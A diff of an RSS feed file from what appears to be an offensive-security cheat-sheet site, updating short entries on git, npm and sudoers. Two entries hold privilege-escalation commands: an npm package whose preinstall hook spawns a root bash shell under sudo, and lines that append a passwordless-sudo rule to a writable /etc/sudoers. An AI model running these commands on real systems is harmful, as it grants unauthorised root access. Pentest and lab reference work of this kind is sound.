@@ -19,14 +19,14 @@
       <link>https://tldrbins.github.io/git/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/git/</guid>
-      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;lt;BRANCH_NAME&amp;gt; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;lt;COMMIT_HASH&amp;gt; SUDO # Copy target project cp -r /var/www/html/project .</description>
+      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;lt;BRANCH_NAME&amp;gt; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;lt;COMMIT_HASH&amp;gt; Git Tools git-dumper git-bundle git-dumper http://10.</description>
     </item>
     <item>
       <title>npm</title>
       <link>https://tldrbins.github.io/npm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/npm/</guid>
-      <description> SUDO Create a package.json&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
+      <description> SUDO Create a &amp;lsquo;package.json&amp;rsquo;&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
     </item>
     <item>
       <title>pip</title>
@@ -40,7 +40,7 @@
       <link>https://tldrbins.github.io/sudoers/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sudoers/</guid>
-      <description> Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
+      <description> Abuse #1: Writable /etc/sudoers chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
     </item>
   </channel>
 </rss>
